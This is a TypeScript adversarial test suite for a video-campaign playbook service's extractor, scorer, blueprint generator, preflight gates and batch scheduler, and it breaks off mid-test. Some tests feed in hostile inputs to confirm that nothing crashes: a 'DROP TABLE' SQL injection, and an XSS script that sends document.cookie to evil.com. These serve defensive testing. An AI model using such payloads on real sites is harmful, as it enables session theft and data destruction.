/**
 * Tier 5 White-Box Adversarial Stress Test Suite: Auto-Creative Playbook & Campaign Intelligence
 *
 * Implements rigorous adversarial verification for Phase 5:
 * 1. Extreme and boundary inputs to extractCreativeVariables:
 *    - Empty narration, whitespace, null byte injection, unicode homoglyphs, emojis, XSS payloads.
 *    - Extreme duration numbers: negative (-100s), zero (0s), extreme (>1000s, 999999s),
 *      non-finite (NaN, Infinity), string numbers, non-numeric strings, null/undefined.
 *    - Missing, partial, and malformed script/audio/video assets.
 * 2. Extreme and boundary inputs to calculateEffectivenessScore:
 *    - Sample size boundary: < 5 (0, 1, 2, 3, 4, -5, 4.99) strictly returns confidence === 0.
 *    - Sample size >= 5 (5, 6, 50, 1000) returns confidence > 0, saturating at N=50.
 *    - Zero-division guards across impressions, clicks, conversions, views, watchTime, spend.
 *    - Extreme numerical ranges and consistency bounds clamping [0, 1].
 * 3. Extreme and boundary inputs to generateCampaignBlueprint:
 *    - Empty/giant topic strings, XSS/SQL injection strings in topic/channel.
 *    - Low confidence (<0.70) pattern rejection with safe fallback.
 *    - Invalid hook styles / voice profiles rejection in pattern store.
 * 4. 7-Gate Preflight Fail-Closed Verification:
 *    - Gate 1: Auth failure (NOT_AUTHENTICATED).
 *    - Gate 2: Workspace ownership failure (WORKSPACE_ACCESS_DENIED).
 *    - Gate 3: Entitlement failure (INSUFFICIENT_ENTITLEMENT).
 *    - Gate 4: Credential failure (NO_BYOK_CREDENTIALS / MISSING_PROVIDER_CREDENTIAL).
 *    - Gate 5: Capability failure (CAPABILITY_NOT_SUPPORTED).
 *    - Gate 6: Storage failure (STORAGE_UNAVAILABLE).
 *    - Gate 7: Queue failure (QUEUE_UNAVAILABLE).
 *    - Cost Spike Ceiling: 500¢ passes, 501¢ strictly fails closed with BILLING_FAILURE.
 * 5. Batch Scheduler Zero-Dispatch & Zero-Deduction Guarantee:
 *    - Confirms that any preflight failure or cost spike strictly halts execution
 *      BEFORE credit deduction and BEFORE multi-track mission dispatch.
 *
 * Architecture Compliance:
 * - Zero `:any` types.
 * - Strict 4-layer boundary hierarchy.
 *
 * @module __tests__/e2e/playbook-tier5-adversarial.test
 */

import { describe, it, expect, vi, beforeEach } from 'vitest';
import { createRequire } from 'node:module';

// ── In-Memory SQLite Shim & Mock Setup ───────────────────────────────────────

const req = createRequire(import.meta.url);
const { DatabaseSync } = req('node:sqlite') as {
  DatabaseSync: new (path: string) => {
    exec(sql: string): void;
    prepare(sql: string): {
      get(...params: unknown[]): unknown;
      all(...params: unknown[]): unknown[];
      run(...params: unknown[]): { lastInsertRowid: bigint; changes: number };
    };
  };
};

type StatementSync = ReturnType<InstanceType<typeof DatabaseSync>['prepare']>;

function makeD1(db: InstanceType<typeof DatabaseSync>) {
  return {
    prepare(sql: string) {
      const stmt: StatementSync = db.prepare(sql);
      return {
        bind: (...params: unknown[]) => {
          const sanitized = params.map((p) => (p === undefined ? null : p));
          return {
            first: async <T = Record<string, unknown>>() =>
              stmt.get(...sanitized) as T | undefined,
            run: async () => {
              const r = stmt.run(...sanitized);
              return {
                success: true,
                meta: { changes: Number(r.changes ?? 0), duration: 0 },
              };
            },
            all: async <T = Record<string, unknown>>() => {
              return {
                results: stmt.all(...sanitized) as T[],
                meta: { changes: 0, duration: 0 },
              };
            },
          };
        },
        first: async <T = Record<string, unknown>>() => stmt.get() as T | undefined,
        run: async () => {
          const r = stmt.run();
          return {
            success: true,
            meta: { changes: Number(r.changes ?? 0), duration: 0 },
          };
        },
        all: async <T = Record<string, unknown>>() => {
          return { results: stmt.all() as T[], meta: { changes: 0, duration: 0 } };
        },
      };
    },
    exec: (sql: string) => db.exec(sql),
  };
}

const mocks = vi.hoisted(() => ({
  mockGetD1: vi.fn(),
  mockCreateServerClient: vi.fn(),
  mockGetCurrentUser: vi.fn(),
  mockVerifyWorkspaceAccess: vi.fn(),
  mockGetUserTier: vi.fn(),
  mockGetBalance: vi.fn(),
  mockDeductCredits: vi.fn(),
  mockListUserApiKeyProviders: vi.fn(),
  mockGetUserApiKey: vi.fn(),
  mockCreateMission: vi.fn(),
  mockDispatchMultiTrackMission: vi.fn(),
}));

vi.mock('@/seed/db/client', () => ({
  getD1: mocks.mockGetD1,
  createServerClient: mocks.mockCreateServerClient,
  tryCreateServerClientSync: mocks.mockCreateServerClient,
}));

vi.mock('@/seed/utils/logger-utility', () => ({
  logger: {
    info: vi.fn(),
    warn: vi.fn(),
    error: vi.fn(),
    debug: vi.fn(),
  },
}));

vi.mock('@/seed/auth/better-auth-session', () => ({
  getCurrentUser: mocks.mockGetCurrentUser,
}));

vi.mock('@/seed/auth/workspace-access', () => ({
  verifyWorkspaceAccess: mocks.mockVerifyWorkspaceAccess,
}));

vi.mock('@/seed/db/get-user-tier', () => ({
  getUserTier: mocks.mockGetUserTier,
}));

vi.mock('@/seed/db/resolve-user-tier', () => ({
  resolveUserTier: mocks.mockGetUserTier,
}));

vi.mock('@/tree/mcu/credits-repo', () => ({
  getBalance: mocks.mockGetBalance,
  deductCredits: mocks.mockDeductCredits,
}));

vi.mock('@/tree/byok/user-api-key-store', () => ({
  listUserApiKeyProviders: mocks.mockListUserApiKeyProviders,
  getUserApiKey: mocks.mockGetUserApiKey,
}));

vi.mock('@/tree/mission/repository', () => ({
  createMission: mocks.mockCreateMission,
}));

vi.mock('@/tree/mission/executor-bridge', () => ({
  dispatchMultiTrackMission: mocks.mockDispatchMultiTrackMission,
}));

// ── Domain Imports ──────────────────────────────────────────────────────────

import {
  extractCreativeVariables,
  bucketDurationPattern,
  extractHookStyleFromScene0,
  extractVoiceProfileFromMetadata,
} from '@/tree/learning-loop/pattern-extractor';
import {
  calculateEffectivenessScore,
  computeLogarithmicConfidence,
  determineConfidenceLevel,
  MIN_LEARNING_SAMPLE,
} from '@/tree/learning-loop/effectiveness-scorer';
import {
  generateCampaignBlueprint,
  MIN_PATTERN_CONFIDENCE,
  DEFAULT_ESTIMATED_COST_CENTS,
} from '@/forest/playbook/campaign-generator';
import {
  runMissionPreflightCheck,
  MAX_SINGLE_MISSION_COST_CENTS,
} from '@/tree/mission/preflight-check';
import {
  processRecurringCampaignBatch,
  type ScheduledCampaignRow,
} from '@/forest/playbook/batch-scheduler';
import { FailureKind } from '@/seed/types/failure-kind';
import type { PlaybookPattern } from '@/seed/types/playbook-pattern';

describe('Auto-Creative Playbook & Campaign Intelligence — Tier 5 Adversarial Suite', () => {
  let inMemoryDb: InstanceType<typeof DatabaseSync>;

  beforeEach(() => {
    vi.clearAllMocks();

    inMemoryDb = new DatabaseSync(':memory:');
    inMemoryDb.exec(`
      CREATE TABLE IF NOT EXISTS scheduled_campaigns (
        id TEXT PRIMARY KEY,
        workspace_id TEXT,
        user_id TEXT NOT NULL,
        topic TEXT NOT NULL,
        template_script TEXT,
        interval_days INTEGER DEFAULT 7,
        next_run_date TEXT NOT NULL,
        last_run_date TEXT,
        is_active INTEGER NOT NULL DEFAULT 1,
        created_at TEXT DEFAULT (datetime('now')),
        updated_at TEXT DEFAULT (datetime('now'))
      );

      CREATE TABLE IF NOT EXISTS recurring_campaign_runs (
        id TEXT PRIMARY KEY,
        workspace_id TEXT NOT NULL,
        user_id TEXT NOT NULL,
        blueprint_id TEXT NOT NULL,
        schedule_cron TEXT NOT NULL DEFAULT '0 9 * * 1',
        batch_size INTEGER NOT NULL DEFAULT 1,
        next_run_at INTEGER NOT NULL,
        last_run_at INTEGER,
        is_active INTEGER NOT NULL DEFAULT 1,
        total_runs INTEGER NOT NULL DEFAULT 0,
        last_status TEXT NOT NULL DEFAULT 'idle',
        created_at INTEGER NOT NULL,
        updated_at INTEGER NOT NULL
      );
    `);

    const d1 = makeD1(inMemoryDb);
    mocks.mockGetD1.mockResolvedValue(d1);

    mocks.mockCreateServerClient.mockReturnValue({
      from: (table: string) => ({
        select: () => ({
          eq: () => ({
            lte: async () => ({
              data: inMemoryDb
                .prepare(`SELECT * FROM ${table} WHERE is_active = 1`)
                .all(),
              error: null,
            }),
          }),
        }),
        update: () => ({
          eq: () => ({
            eq: async () => ({ error: null }),
          }),
        }),
      }),
    });

    mocks.mockGetCurrentUser.mockResolvedValue({ id: 'usr_test_adv' });
    mocks.mockVerifyWorkspaceAccess.mockResolvedValue(true);
    mocks.mockGetUserTier.mockResolvedValue('PREMIUM');
    mocks.mockGetBalance.mockResolvedValue({ credits_remaining: 50000 });
    mocks.mockListUserApiKeyProviders.mockResolvedValue([
      'openrouter',
      'elevenlabs',
      'fal',
      'replicate',
    ]);
    mocks.mockGetUserApiKey.mockResolvedValue('test_byok_key_12345');
    mocks.mockDeductCredits.mockResolvedValue({ success: true, remaining: 49850 });
    mocks.mockCreateMission.mockImplementation(async (mission) => mission);
    mocks.mockDispatchMultiTrackMission.mockResolvedValue({ success: true });
  });

  // ═══════════════════════════════════════════════════════════════════════════
  // Section 1: Extreme & Boundary Inputs to Creative Variable Extractor
  // ═══════════════════════════════════════════════════════════════════════════

  describe('1. Creative Variable Extractor Stress Testing', () => {
    it('1.1 handles empty string, pure whitespace, and null script narration safely', () => {
      const inputs = ['', '   ', '\t\n\r', null, undefined];
      for (const input of inputs) {
        const style = extractHookStyleFromScene0(input);
        expect(style).toBe('curiosity_gap');
      }

      const emptyObjResult = extractHookStyleFromScene0({});
      expect(emptyObjResult).toBe('curiosity_gap');

      const emptyNarrationResult = extractHookStyleFromScene0({ narration: '   ' });
      expect(emptyNarrationResult).toBe('curiosity_gap');
    });

    it('1.2 withstands null byte injection and malicious control characters without crashing', () => {
      const nullBytePayload = 'Stop doing this!\0<script>alert(1)</script>';
      const hookStyle = extractHookStyleFromScene0({ narration: nullBytePayload });
      // "Stop doing this" matches problem agitation before null byte
      expect(hookStyle).toBe('problem_agitation');

      const pureNullByte = '\0\0\0\0';
      expect(extractHookStyleFromScene0({ narration: pureNullByte })).toBe('curiosity_gap');
    });

    it('1.3 withstands unicode homoglyphs, RTL overrides, emojis, and multi-byte characters', () => {
      // Cyrillic homoglyphs look like English "Stop doing" but are different code points
      const cyrillicHomoglyph = 'Ѕtор dоіng thіѕ nоw!';
      const styleHomoglyph = extractHookStyleFromScene0({ narration: cyrillicHomoglyph });
      expect(['curiosity_gap', 'problem_agitation']).toContain(styleHomoglyph);

      // Emojis with Vietnamese agitation
      const emojiVn = '🚨🔥 CẢNH BÁO: Đừng bao giờ mua hàng khi chưa biết điều này! 😱';
      const styleEmoji = extractHookStyleFromScene0({ narration: emojiVn });
      expect(styleEmoji).toBe('problem_agitation');

      // RTL override injection
      const rtlPayload = '\u202Ewhy would anyone do this?\u202C';
      const styleRtl = extractHookStyleFromScene0({ narration: rtlPayload });
      expect(styleRtl).toBe('question');
    });

    it('1.4 withstands SQL injection and XSS vector narration without throwing', () => {
      const sqlPayload = "'; DROP TABLE creative_missions; SELECT * FROM users WHERE '1'='1";
      const xssPayload = "<script>fetch('https://evil.com/steal?c=' + document.cookie)</script>";

      expect(() => extractHookStyleFromScene0({ narration: sqlPayload })).not.toThrow();
      expect(() => extractHookStyleFromScene0({ narration: xssPayload })).not.toThrow();
    });

    it('1.5 withstands ReDoS-style pathological string payloads under 10ms', () => {
      const pathological = 'a'.repeat(20000) + '?!';
      const start = Date.now();
      const style = extractHookStyleFromScene0({ narration: pathological });
      const elapsed = Date.now() - start;

      expect(elapsed).toBeLessThan(50);
      expect(style).toBe('question');
    });

    it('1.6 buckets non-standard duration numbers safely (negative, 0, >1000s, NaN, Infinity)', () => {
      // Negative durations
      expect(bucketDurationPattern(-1)).toBe('0-15s');
      expect(bucketDurationPattern(-100.5)).toBe('0-15s');
      expect(bucketDurationPattern(-0.0001)).toBe('0-15s');

      // Zero durations
      expect(bucketDurationPattern(0)).toBe('0-15s');
      expect(bucketDurationPattern(-0)).toBe('0-15s');

      // Extreme large numbers (>1000s)
      expect(bucketDurationPattern(1001)).toBe('90s+');
      expect(bucketDurationPattern(999999)).toBe('90s+');

      // Non-finite numbers
      expect(bucketDurationPattern(NaN)).toBe('0-15s');
      expect(bucketDurationPattern(Infinity)).toBe('0-15s');
      expect(bucketDurationPattern(-Infinity)).toBe('0-15s');

      // Exact boundaries
      expect(bucketDurationPattern(15)).toBe('0-15s');
      expect(bucketDurationPattern(15.0001)).toBe('16-30s');
      expect(bucketDurationPattern(30)).toBe('16-30s');
      expect(bucketDurationPattern(30.0001)).toBe('31-60s');
      expect(bucketDurationPattern(60)).toBe('31-60s');
      expect(bucketDurationPattern(60.0001)).toBe('61-90s');
      expect(bucketDurationPattern(90)).toBe('61-90s');
      expect(bucketDurationPattern(90.0001)).toBe('90s+');

      // Strings and malformed
      expect(bucketDurationPattern('25')).toBe('16-30s');
      expect(bucketDurationPattern('-15')).toBe('0-15s');
      expect(bucketDurationPattern('not-a-number')).toBe('0-15s');
      expect(bucketDurationPattern('')).toBe('0-15s');
      expect(bucketDurationPattern(null)).toBe('0-15s');
      expect(bucketDurationPattern(undefined)).toBe('0-15s');
    });

    it('1.7 safely handles empty, missing, or malformed assets array in extractCreativeVariables', () => {
      const mission = {
        id: 'm_adv_1',
        workspaceId: 'ws_adv_1',
      };

      // Completely empty assets
      const resEmpty = extractCreativeVariables(mission, []);
      expect(resEmpty.missionId).toBe('m_adv_1');
      expect(resEmpty.workspaceId).toBe('ws_adv_1');
      expect(resEmpty.hookStyle).toBe('curiosity_gap');
      expect(resEmpty.voiceProfile).toBe('calm_authoritative');
      expect(resEmpty.actualDurationSeconds).toBe(60);
      expect(resEmpty.durationPattern).toBe('31-60s');
      expect(resEmpty.aspectRatio).toBe('9:16');
      expect(resEmpty.sceneCount).toBe(1);

      // Malformed asset objects (missing fields, unexpected types)
      const malformedAssets = [
        { type: 'unknown_type', data: null },
        { type: 'script', metadata: { scenes: 'not_an_array' } },
        { type: 'audio', metadata: null, durationSeconds: -50 },
        { type: 'video', metadata: { aspectRatio: '3:4_unsupported' }, durationSeconds: NaN },
      ];

      const resMalformed = extractCreativeVariables(mission, malformedAssets);
      expect(resMalformed.hookStyle).toBe('curiosity_gap');
      expect(resMalformed.actualDurationSeconds).toBe(60);
      expect(resMalformed.aspectRatio).toBe('9:16');
    });
  });

  // ═══════════════════════════════════════════════════════════════════════════
  // Section 2: Extreme & Boundary Inputs to Effectiveness Scorer
  // ═══════════════════════════════════════════════════════════════════════════

  describe('2. Effectiveness Scorer Boundary & Statistical Rigor', () => {
    it('2.1 strictly rejects sample sizes < 5, returning 0 confidence', () => {
      const invalidSampleSizes = [-100, -1, 0, 1, 2, 3, 4, 4.999];

      for (const n of invalidSampleSizes) {
        const conf = computeLogarithmicConfidence(n);
        expect(conf).toBe(0);

        const scoreRes = calculateEffectivenessScore({
          sampleSize: n,
          ctr: 0.25,
          retentionRate: 0.8,
          conversionRate: 0.1,
          efficiencyScore: 0.9,
        });
        expect(scoreRes.confidence).toBe(0);
        expect(scoreRes.confidenceLevel).toBe('low');
      }
    });

    it('2.2 begins statistical scoring strictly at sample size >= 5 and saturates at N=50', () => {
      expect(MIN_LEARNING_SAMPLE).toBe(5);

      const confAt5 = computeLogarithmicConfidence(5);
      expect(confAt5).toBeGreaterThan(0);
      expect(confAt5).toBeCloseTo(0.672, 2);

      const confAt50 = computeLogarithmicConfidence(50);
      expect(confAt50).toBe(1.0);

      // Above saturation, confidence stays clamped at 1.0
      const confAt1000 = computeLogarithmicConfidence(1000);
      expect(confAt1000).toBe(1.0);
    });

    it('2.3 provides zero-division guard against all-zero metrics and zero spend/impressions', () => {
      const allZeros = calculateEffectivenessScore({
        impressions: 0,
        clicks: 0,
        views: 0,
        conversions: 0,
        spendCents: 0,
        revenueCents: 0,
        watchTimeSeconds: 0,
        totalDurationSeconds: 0,
      });

      expect(Number.isFinite(allZeros.score)).toBe(true);
      expect(allZeros.score).toBe(0);
      expect(allZeros.ctr).toBe(0);
      expect(allZeros.retentionRate).toBe(0);
      expect(allZeros.conversionRate).toBe(0);
      expect(allZeros.efficiencyScore).toBe(0);
      expect(allZeros.confidence).toBe(0);
      expect(allZeros.confidenceLevel).toBe('low');
    });

    it('2.4 handles extreme numerical ranges (huge numbers, negative metrics) safely', () => {
      const hugeMetrics = calculateEffectivenessScore({
        impressions: 100_000_000,
        clicks: 10_000_000,
        views: 50_000_000,
        conversions: 1_000_000,
        spendCents: 50_000_000,
        revenueCents: 200_000_000,
        watchTimeSeconds: 150_000_000,
        totalDurationSeconds: 300_000_000,
      });

      expect(Number.isFinite(hugeMetrics.score)).toBe(true);
      expect(hugeMetrics.score).toBeGreaterThan(0);
      expect(hugeMetrics.score).toBeLessThanOrEqual(100);
      expect(hugeMetrics.confidence).toBe(1.0);
      expect(hugeMetrics.confidenceLevel).toBe('high');

      // Negative metrics clamped safely to 0
      const negativeMetrics = calculateEffectivenessScore({
        impressions: -500,
        clicks: -50,
        views: -100,
        conversions: -10,
        spendCents: -5000,
      });
      expect(negativeMetrics.score).toBe(0);
      expect(negativeMetrics.confidence).toBe(0);
    });

    it('2.5 clamps consistency weighting between [0, 1] when given adversarial values', () => {
      // Consistency < 0 clamped to 0
      const confNeg = computeLogarithmicConfidence(50, -5.0);
      expect(confNeg).toBe(0.6); // sampleScore (1.0 * 0.6) + consistency (0 * 0.4)

      // Consistency > 1 clamped to 1
      const confOver = computeLogarithmicConfidence(50, 99.0);
      expect(confOver).toBe(1.0);
    });
  });

  // ═══════════════════════════════════════════════════════════════════════════
  // Section 3: Extreme Inputs to Campaign Blueprint Generator
  // ═══════════════════════════════════════════════════════════════════════════

  describe('3. Campaign Blueprint Generator Adversarial Testing', () => {
    it('3.1 handles empty topic, massive topic (10,000 chars), and injection payloads', async () => {
      // Empty topic
      const bpEmpty = await generateCampaignBlueprint('ws_adv_bp', '');
      expect(bpEmpty.id).toContain('ws_adv_bp');
      expect(bpEmpty.name.en).toBe(' — High Conversion Playbook');
      expect(bpEmpty.durationSeconds).toBe(60);

      // Giant topic string
      const giantTopic = 'A'.repeat(10000);
      const bpGiant = await generateCampaignBlueprint('ws_adv_bp', giantTopic);
      expect(bpGiant.name.en).toBe(`${giantTopic} — High Conversion Playbook`);
      expect(bpGiant.estimatedScenes).toBe(5);

      // Injection payload in topic
      const injectionTopic = "Summer Sale'; DROP TABLE campaign_blueprints; -- <script>alert(1)</script>";
      const bpInj = await generateCampaignBlueprint('ws_adv_bp', injectionTopic);
      expect(bpInj.suggestedPrompts[0].en).toContain(injectionTopic);
    });

    it('3.2 strictly rejects patterns with confidence < 0.70 and falls back to defaults', async () => {
      expect(MIN_PATTERN_CONFIDENCE).toBe(0.7);

      const lowConfidencePatterns: PlaybookPattern[] = [
        {
          id: 'p_low_1',
          workspaceId: 'ws_adv_bp',
          featureKey: 'hook_style',
          featureValue: 'bold_claim',
          metric: 'ctr',
          avgMetric: 0.12,
          sampleSize: 10,
          confidence: 0.69, // Below 0.70 threshold
          confidenceLevel: 'medium',
          source: 'mission',
          detectedAt: Date.now(),
        },
        {
          id: 'p_low_2',
          workspaceId: 'ws_adv_bp',
          featureKey: 'duration',
          featureValue: '0-15s',
          metric: 'ctr',
          avgMetric: 0.15,
          sampleSize: 10,
          confidence: 0.55,
          confidenceLevel: 'medium',
          source: 'mission',
          detectedAt: Date.now(),
        },
      ];

      const bp = await generateCampaignBlueprint(
        'ws_adv_bp',
        'Fitness Coaching',
        lowConfidencePatterns,
      );

      // Must fall back to default hook and duration since confidence < 0.70
      expect(bp.hookStyle).toBe('curiosity_gap');
      expect(bp.durationSeconds).toBe(60);
      expect(bp.sourcePatternIds).toHaveLength(0);
    });

    it('3.3 ignores unsupported or malicious hook styles in pattern store', async () => {
      const maliciousPatterns: PlaybookPattern[] = [
        {
          id: 'p_mal_1',
          workspaceId: 'ws_adv_bp',
          featureKey: 'hook_style',
          featureValue: 'malicious_nonexistent_hook_style' as unknown as string,
          metric: 'ctr',
          avgMetric: 0.99,
          sampleSize: 100,
          confidence: 0.99,
          confidenceLevel: 'high',
          source: 'mission',
          detectedAt: Date.now(),
        },
      ];

      const bp = await generateCampaignBlueprint(
        'ws_adv_bp',
        'E-commerce',
        maliciousPatterns,
      );

      expect(bp.hookStyle).toBe('curiosity_gap');
    });

    it('3.4 maps channels to safe platform and aspect ratio with robust fallback', async () => {
      const testCases = [
        { channel: 'unknown_metaverse_tv', expectedPlatform: 'youtube_shorts', expectedAspect: '9:16' },
        { channel: 'tiktok_viral_feed', expectedPlatform: 'tiktok', expectedAspect: '9:16' },
        { channel: 'instagram_reels_pro', expectedPlatform: 'instagram_reels', expectedAspect: '9:16' },
        { channel: 'square_feed_ad', expectedPlatform: 'instagram_reels', expectedAspect: '1:1' },
        { channel: 'youtube', expectedPlatform: 'youtube_shorts', expectedAspect: '16:9' },
        { channel: 'youtube_landscape', expectedPlatform: 'youtube_shorts', expectedAspect: '9:16' },
      ];

      for (const tc of testCases) {
        const bp = await generateCampaignBlueprint('ws_adv_bp', 'Test', tc.channel);
        expect(bp.targetPlatform).toBe(tc.expectedPlatform);
        expect(bp.aspectRatio).toBe(tc.expectedAspect);
      }
    });
  });

  // ═══════════════════════════════════════════════════════════════════════════
  // Section 4: 7-Gate Preflight Fail-Closed Behavior & Cost Spike Ceiling
  // ═══════════════════════════════════════════════════════════════════════════

  describe('4. 7-Gate Preflight Fail-Closed Verification & Cost Spike Ceiling', () => {
    const validOpts = {
      userId: 'usr_adv_test',
      workspaceId: 'ws_adv_test',
      requiredCapabilities: ['AI_TEXT', 'AI_AUDIO', 'AI_IMAGE', 'AI_VIDEO'] as const,
      estimatedCostCents: 150,
      overrides: {
        membershipVerified: true,
        mcuBalance: 10000,
        tier: 'PREMIUM',
        storageReady: true,
        queueReady: true,
      },
    };

    it('4.1 Gate 1 (auth): fails closed when unauthenticated', async () => {
      mocks.mockGetCurrentUser.mockResolvedValue(null);

      const res = await runMissionPreflightCheck({
        workspaceId: 'ws_adv_test',
        // userId omitted
      });

      expect(res.passed).toBe(false);
      expect(res.failureCode).toBe('NOT_AUTHENTICATED');
      expect(res.gates.auth.passed).toBe(false);
      expect(res.gates.ownership.code).toBe('SKIPPED');
      expect(res.gates.entitlement.code).toBe('SKIPPED');
    });

    it('4.2 Gate 2 (ownership): fails closed when user does not belong to workspace', async () => {
      mocks.mockVerifyWorkspaceAccess.mockResolvedValue(false);

      const res = await runMissionPreflightCheck({
        userId: 'usr_intruder',
        workspaceId: 'ws_victim',
        overrides: {
          membershipVerified: false,
        },
      });

      expect(res.passed).toBe(false);
      expect(res.failureCode).toBe('WORKSPACE_ACCESS_DENIED');
      expect(res.gates.auth.passed).toBe(true);
      expect(res.gates.ownership.passed).toBe(false);
      expect(res.gates.entitlement.code).toBe('SKIPPED');
    });

    it('4.3 Gate 3 (entitlement): fails closed when MCU balance is 0 on non-MASTER tier', async () => {
      mocks.mockGetUserTier.mockResolvedValue('PREMIUM');
      mocks.mockGetBalance.mockResolvedValue({ credits_remaining: 0 });

      const res = await runMissionPreflightCheck({
        ...validOpts,
        overrides: {
          ...validOpts.overrides,
          mcuBalance: 0,
          tier: 'PREMIUM',
        },
      });

      expect(res.passed).toBe(false);
      expect(res.failureCode).toBe('INSUFFICIENT_ENTITLEMENT');
      expect(res.gates.entitlement.passed).toBe(false);
      expect(res.gates.credential.code).toBe('SKIPPED');
    });

    it('4.4 Gate 3 (cost spike ceiling): 500¢ passes, 501¢ strictly fails with BILLING_FAILURE', async () => {
      expect(MAX_SINGLE_MISSION_COST_CENTS).toBe(500);

      // Exact 500¢ ceiling passes
      const pass500 = await runMissionPreflightCheck({
        ...validOpts,
        estimatedCostCents: 500,
      });
      expect(pass500.passed).toBe(true);
      expect(pass500.gates.entitlement.passed).toBe(true);

      // 501¢ triggers spike guard fail-closed
      const fail501 = await runMissionPreflightCheck({
        ...validOpts,
        estimatedCostCents: 501,
      });
      expect(fail501.passed).toBe(false);
      expect(fail501.failureCode).toBe(FailureKind.BILLING_FAILURE);
      expect(fail501.failureReason).toContain('exceeds single mission limit (500¢)');
      expect(fail501.gates.entitlement.passed).toBe(false);

      // Massive cost spike (10,000¢) immediately fails closed
      const failMassive = await runMissionPreflightCheck({
        ...validOpts,
        estimatedCostCents: 10000,
      });
      expect(failMassive.passed).toBe(false);
      expect(failMassive.failureCode).toBe(FailureKind.BILLING_FAILURE);
    });

    it('4.5 Gate 4 (credentials): fails closed when zero BYOK credentials configured', async () => {
      mocks.mockListUserApiKeyProviders.mockResolvedValue([]);

      const res = await runMissionPreflightCheck(validOpts);

      expect(res.passed).toBe(false);
      expect(res.failureCode).toBe('NO_BYOK_CREDENTIALS');
      expect(res.gates.credential.passed).toBe(false);
      expect(res.gates.capability.code).toBe('SKIPPED');
    });

    it('4.6 Gate 4 (credentials): fails closed when required provider key is missing or empty', async () => {
      mocks.mockListUserApiKeyProviders.mockResolvedValue(['openrouter']);
      mocks.mockGetUserApiKey.mockResolvedValue(''); // Empty key

      const res = await runMissionPreflightCheck({
        ...validOpts,
        requiredProvider: 'elevenlabs',
      });

      expect(res.passed).toBe(false);
      expect(res.failureCode).toBe('MISSING_PROVIDER_CREDENTIAL');
      expect(res.gates.credential.passed).toBe(false);
    });

    it('4.7 Gate 5 (capabilities): fails closed when configured providers lack required multi-track capability', async () => {
      // Only openrouter configured (AI_TEXT only, lacks AI_AUDIO, AI_IMAGE, AI_VIDEO)
      mocks.mockListUserApiKeyProviders.mockResolvedValue(['openrouter']);

      const res = await runMissionPreflightCheck(validOpts);

      expect(res.passed).toBe(false);
      expect(res.failureCode).toBe('CAPABILITY_NOT_SUPPORTED');
      expect(res.gates.capability.passed).toBe(false);
      expect(res.gates.storage.code).toBe('SKIPPED');
    });

    it('4.8 Gate 6 (storage): fails closed when storage subsystem is disconnected', async () => {
      const res = await runMissionPreflightCheck({
        ...validOpts,
        overrides: {
          ...validOpts.overrides,
          storageReady: false,
        },
      });

      expect(res.passed).toBe(false);
      expect(res.failureCode).toBe('STORAGE_UNAVAILABLE');
      expect(res.gates.storage.passed).toBe(false);
      expect(res.gates.queue.code).toBe('SKIPPED');
    });

    it('4.9 Gate 7 (queue): fails closed when Inngest queue subsystem is unreachable', async () => {
      const res = await runMissionPreflightCheck({
        ...validOpts,
        overrides: {
          ...validOpts.overrides,
          queueReady: false,
        },
      });

      expect(res.passed).toBe(false);
      expect(res.failureCode).toBe('QUEUE_UNAVAILABLE');
      expect(res.gates.queue.passed).toBe(false);
    });
  });

  // ═══════════════════════════════════════════════════════════════════════════
  // Section 5: Batch Scheduler Execution & Credit Deduction Safeguards
  // ═══════════════════════════════════════════════════════════════════════════

  describe('5. Batch Scheduler Fail-Closed Dispatch & Billing Safeguards', () => {
    it('5.1 terminates execution without deducting credits or dispatching when preflight fails at Gate 1 (auth)', async () => {
      mocks.mockGetCurrentUser.mockResolvedValue(null);

      inMemoryDb.exec(`
        INSERT INTO scheduled_campaigns (id, workspace_id, user_id, topic, next_run_date, is_active)
        VALUES ('sched_gate1', 'ws_test', '', 'Viral Drops', '2026-09-19', 1);
      `);

      const res = await processRecurringCampaignBatch('2026-09-19');

      expect(res.processed).toBe(1);
      expect(res.dispatched).toBe(0);
      expect(res.skippedPreflight).toBe(1);
      expect(mocks.mockDeductCredits).not.toHaveBeenCalled();
      expect(mocks.mockDispatchMultiTrackMission).not.toHaveBeenCalled();
    });

    it('5.2 terminates execution without deducting credits or dispatching when preflight fails at Gate 3 (entitlement 0 MCU)', async () => {
      mocks.mockGetBalance.mockResolvedValue({ credits_remaining: 0 });

      inMemoryDb.exec(`
        INSERT INTO scheduled_campaigns (id, workspace_id, user_id, topic, next_run_date, is_active)
        VALUES ('sched_gate3', 'ws_test', 'usr_broke', 'Viral Drops', '2026-09-19', 1);
      `);

      const res = await processRecurringCampaignBatch('2026-09-19');

      expect(res.processed).toBe(1);
      expect(res.dispatched).toBe(0);
      expect(res.skippedPreflight).toBe(1);
      expect(mocks.mockDeductCredits).not.toHaveBeenCalled();
      expect(mocks.mockDispatchMultiTrackMission).not.toHaveBeenCalled();
    });

    it('5.3 terminates execution without deducting credits or dispatching when preflight fails at Gate 4 (no BYOK keys)', async () => {
      mocks.mockListUserApiKeyProviders.mockResolvedValue([]);

      inMemoryDb.exec(`
        INSERT INTO scheduled_campaigns (id, workspace_id, user_id, topic, next_run_date, is_active)
        VALUES ('sched_gate4', 'ws_test', 'usr_nokey', 'Viral Drops', '2026-09-19', 1);
      `);

      const res = await processRecurringCampaignBatch('2026-09-19');

      expect(res.processed).toBe(1);
      expect(res.dispatched).toBe(0);
      expect(res.skippedPreflight).toBe(1);
      expect(mocks.mockDeductCredits).not.toHaveBeenCalled();
      expect(mocks.mockDispatchMultiTrackMission).not.toHaveBeenCalled();
    });

    it('5.4 terminates execution without deducting credits or dispatching when cost spike occurs (>500¢)', async () => {
      // In recurring_campaign_runs, batch_size = 4 * 150¢ = 600¢ (> 500¢ spike guard)
      inMemoryDb.exec(`
        INSERT INTO recurring_campaign_runs (
          id, workspace_id, user_id, blueprint_id, schedule_cron, batch_size, next_run_at, is_active, total_runs, created_at, updated_at
        ) VALUES (
          'rec_spike_600', 'ws_test', 'usr_test_adv', 'bp_1', '0 9 * * 1', 4, 1000, 1, 0, 1000, 1000
        );
      `);

      const res = await processRecurringCampaignBatch('2026-09-19');

      expect(res.processed).toBe(1);
      expect(res.dispatched).toBe(0);
      expect(res.skippedPreflight).toBe(1); // Blocked by preflight spike guard
      expect(mocks.mockDeductCredits).not.toHaveBeenCalled();
      expect(mocks.mockDispatchMultiTrackMission).not.toHaveBeenCalled();
    });

    it('5.5 successfully dispatches and advances CAS date ONLY when all 7 gates and cost ceiling pass', async () => {
      inMemoryDb.exec(`
        INSERT INTO scheduled_campaigns (id, workspace_id, user_id, topic, next_run_date, is_active)
